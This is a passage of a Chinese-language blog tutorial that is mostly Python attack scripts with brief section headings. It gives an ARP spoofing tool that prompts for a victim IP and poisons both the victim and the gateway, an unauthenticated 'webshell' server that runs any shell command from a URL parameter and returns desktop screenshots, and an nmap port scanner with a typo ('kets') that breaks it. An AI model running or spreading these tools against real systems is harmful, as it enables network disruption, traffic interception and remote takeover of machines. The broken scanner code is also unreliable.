punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    netcard <span class=\"token operator\">=</span> <span class=\"token string\">'Intel(R) Wi-Fi 6 AX201 160MHz'</span>  <span class=\"token comment\"># 攻击的网卡 (网卡名字，在上面命令得到的接口列表里)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    cmdcode <span class=\"token operator\">=</span> <span class=\"token string\">'route print'</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># 执行 cmd 命令获得当前主机 ip 和网关</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>cmdcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token comment\"># 通过 line 获得 IPv4 和网关</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        s <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            ip_list <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            wg <span class=\"token operator\">=</span> ip_list<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 网关</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            ip <span class=\"token operator\">=</span> ip_list<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># ip</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token comment\"># print(wg,ip)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"使用的网卡是：{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>netcard<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本机的上网IP是：{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"本机的上网网关：{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>wg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token comment\"># 封装一个 ARP 的数据包，符合以太网的包定义</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    arppk <span class=\"token operator\">=</span> Ether<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span><span class=\"token string\">\"ff:ff:ff:ff:ff:ff\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ARP<span class=\"token punctuation\">(</span>pdst<span class=\"token operator\">=</span>wg<span class=\"token operator\">+</span><span class=\"token string\">\"/24\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token comment\"># 将包抛出去</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    ansip<span class=\"token punctuation\">,</span> unansip <span class=\"token operator\">=</span> srp<span class=\"token punctuation\">(</span>arppk<span class=\"token punctuation\">,</span> iface<span class=\"token operator\">=</span>netcard<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"扫描到{}台在线主机\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ansip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"扫描到{}台不在线主机\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>unansip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    ansresip <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">for</span> s<span class=\"token punctuation\">,</span> r <span class=\"token keyword\">in</span> ansip<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        ansresip<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>r<span class=\"token punctuation\">.</span>psrc<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>hwsrc<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ip,mac</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    ansresip<span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 去重排序</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">for</span> ip<span class=\"token punctuation\">,</span> mac <span class=\"token keyword\">in</span> ansresip<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> <span class=\"token string\">\"--------&gt;\"</span><span class=\"token punctuation\">,</span> mac<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token comment\"># 代理 / 抓包</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token comment\"># 阻断网络</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    vip <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入需要攻击的IP：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    ttl <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入需要攻击的时间(秒)：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\"># 以下实现 arp 攻击即可</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>ttl<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        sendp<span class=\"token punctuation\">(</span>Ether<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span><span class=\"token string\">\"ff:ff:ff:ff:ff:ff\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ARP<span class=\"token punctuation\">(</span>pdst<span class=\"token operator\">=</span>vip<span class=\"token punctuation\">,</span> psrc<span class=\"token operator\">=</span>wg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        sendp<span class=\"token punctuation\">(</span>Ether<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span><span class=\"token string\">\"ff:ff:ff:ff:ff:ff\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ARP<span class=\"token punctuation\">(</span>pdst<span class=\"token operator\">=</span>wg<span class=\"token punctuation\">,</span> psrc<span class=\"token operator\">=</span>vip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"对{}的ARP攻击完成\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>vip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\"># 程序入口</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    scan2spoof<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"313-webshell-一招走天下\"><a class=\"anchor\" href=\"#313-webshell-一招走天下\">#</a> 3.13 webshell 一招走天下</h1>\n<p><strong>webshell，截屏远程控制器</strong></p>\n<h2 id=\"技术分解\"><a class=\"anchor\" href=\"#技术分解\">#</a> 技术分解</h2>\n<ul>\n<li>\n<p>webapp：web 应用</p>\n</li>\n<li>\n<p>http:80/https:443/ws:80/wss:443</p>\n</li>\n<li>\n<p>http(https)/tcp/udp/ws(wss)</p>\n</li>\n<li>\n<p>cmd/shell 等</p>\n</li>\n<li>\n<p>html/css/js 等</p>\n</li>\n<li>\n<p>python/asp/php/jsp 等</p>\n</li>\n<li>\n<p>二进制等</p>\n</li>\n<li>\n<p>流控制等</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-27 19:20:58</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-27 19:57:51</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># python webshell</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 步骤:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 1. 构建一款 HTTP 协议服务器</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 2. 独立开放特定端口</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 3. 构建一个视图 view (mvc)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 4. 执行 shell 命令 + 截取对方的桌面</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 引入</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># tornado 框架</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># pyautogui 截屏</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># os</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>web <span class=\"token keyword\">import</span> RequestHandler<span class=\"token punctuation\">,</span> Application</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>ioloop <span class=\"token keyword\">import</span> IOLoop</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>options <span class=\"token keyword\">import</span> options<span class=\"token punctuation\">,</span> parse_command_line<span class=\"token punctuation\">,</span> define</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">from</span> tornado<span class=\"token punctuation\">.</span>httpserver <span class=\"token keyword\">import</span> HTTPServer</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">import</span> pyautogui</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>define<span class=\"token punctuation\">(</span><span class=\"token string\">'port'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">14444</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'这是http协议通信端口'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">index</span><span class=\"token punctuation\">(</span>RequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># 定义获取 url 的参数</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        key <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>get_query_argument<span class=\"token punctuation\">(</span><span class=\"token string\">\"key\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> <span class=\"token string\">'screenshot'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token comment\"># 截屏</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            img <span class=\"token operator\">=</span> pyautogui<span class=\"token punctuation\">.</span>screenshot<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"screenshot.jpg\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token comment\"># 二进制返回</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            pic <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'screenshot.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            pics <span class=\"token operator\">=</span> pic<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            self<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>pics<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            self<span class=\"token punctuation\">.</span>set_header<span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"image/png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            res <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            self<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">makeapp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">return</span> Application<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'/'</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    parse_command_line<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    app <span class=\"token operator\">=</span> makeapp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token comment\"># 把应用部署到 httpserver</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sever <span class=\"token operator\">=</span> HTTPServer<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    sever<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    sever<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    IOLoop<span class=\"token punctuation\">.</span>current<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"314-我和你之间就差一个-python-nmap\"><a class=\"anchor\" href=\"#314-我和你之间就差一个-python-nmap\">#</a> 3.14 我和你之间就差一个 Python-nmap</h1>\n<p>python-nmap 用的核心方法</p>\n<ul>\n<li>portscanner () 终端扫描的封装</li>\n<li>portscannerhostdict () 扫描完成返回结果集</li>\n</ul>\n<p>实现内网端口扫描工具</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-27 21:41:24</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-27 23:45:06</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 准备工作</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># Window nmap.exe</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># Linux</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># python-namp   pip install python-nmap</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 目标实现指定 IP 或 ip 范围的端口扫描</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">import</span> nmap</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>input_data <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input hosts and ports:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>scan_row <span class=\"token operator\">=</span> input_data<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>scan_row<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>hosts <span class=\"token operator\">=</span> scan_row<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>ports <span class=\"token operator\">=</span> scan_row<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 创建一个扫描对象</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    nm <span class=\"token operator\">=</span> nmap<span class=\"token punctuation\">.</span>PortScanner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nmap not found\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>nm<span class=\"token punctuation\">.</span>scan<span class=\"token punctuation\">(</span>hosts<span class=\"token operator\">=</span>hosts<span class=\"token punctuation\">,</span> arguments<span class=\"token operator\">=</span><span class=\"token string\">' -v -sS -p'</span> <span class=\"token operator\">+</span> ports<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 遍历扫描的主机</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">for</span> host <span class=\"token keyword\">in</span> nm<span class=\"token punctuation\">.</span>all_hosts<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span> <span class=\"token operator\">*</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Host:{}{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>hostname<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'State:{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出主机状态</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">for</span> proto <span class=\"token keyword\">in</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>all_protocols<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 遍历所有的协议</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"protocol:{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>proto<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token comment\"># 扫描所有端口所对应的状态</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        lport <span class=\"token operator\">=</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>proto<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>kets<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">for</span> port <span class=\"token keyword\">in</span> lport<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"port:{}\\tstate:{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                port<span class=\"token punctuation\">,</span> nm<span class=\"token punctuation\">[</span>host<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>proto<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'state'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 